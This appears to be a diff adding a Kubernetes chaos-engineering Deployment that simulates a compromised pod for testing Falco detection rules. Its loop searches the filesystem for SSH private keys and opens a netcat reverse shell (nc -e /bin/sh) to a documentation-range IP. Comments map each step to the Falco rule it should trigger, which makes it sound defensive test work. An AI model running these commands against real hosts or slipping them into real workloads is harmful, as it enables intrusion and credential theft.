@@ -1,0 +1,57 @@
+# Intruder: a compromised pod in the finguard namespace hunts for keys and opens a reverse shell
+#
+# Nothing breaks and Hubble sees little; Falco sees the behaviour. Every 30 s:
+#   find / -name id_rsa ...   -> "Search Private Keys or Passwords" (default rule, Warning)
+#   nc -e /bin/sh <ip> 4444   -> "Netcat Remote Code Execution in Container" (default rule, Warning)
+#   sh, find, nc, head        -> "Unexpected process in FinGuard namespace" (k8s/values/falco.yaml)
+# Grafana: FinGuard dashboard, row "Security · Falco"; Explore: {service_name="falco"}.
+# The reverse shell targets 203.0.113.10 (TEST-NET-3, documentation range): it never connects.
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: chaos-intruder
+  namespace: finguard
+  labels:
+    chaos.finguard.io/scenario: intruder
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: chaos-intruder
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: chaos-intruder
+        chaos.finguard.io/scenario: intruder
+    spec:
+      automountServiceAccountToken: false
+      securityContext:            # namespace finguard enforces Pod Security "restricted"
+        runAsNonRoot: true
+        runAsUser: 65534
+        runAsGroup: 65534
+        seccompProfile:
+          type: RuntimeDefault
+      containers:
+        - name: intruder
+          image: busybox:1.37.0
+          command: ["sh", "-c"]
+          args:
+            - |
+              while true; do
+                echo "$(date -Iseconds) looking for private keys"
+                find / -xdev \( -name id_rsa -o -name id_ed25519 \) 2>/dev/null | head -1
+                echo "$(date -Iseconds) opening a reverse shell"
+                nc -w 2 -e /bin/sh 203.0.113.10 4444 2>/dev/null
+                sleep 30
+              done
+          resources:
+            requests:
+              cpu: 5m
+              memory: 8Mi
+            limits:
+              memory: 32Mi
+          securityContext:
+            allowPrivilegeEscalation: false
+            readOnlyRootFilesystem: true
+            capabilities:
+              drop: ["ALL"]
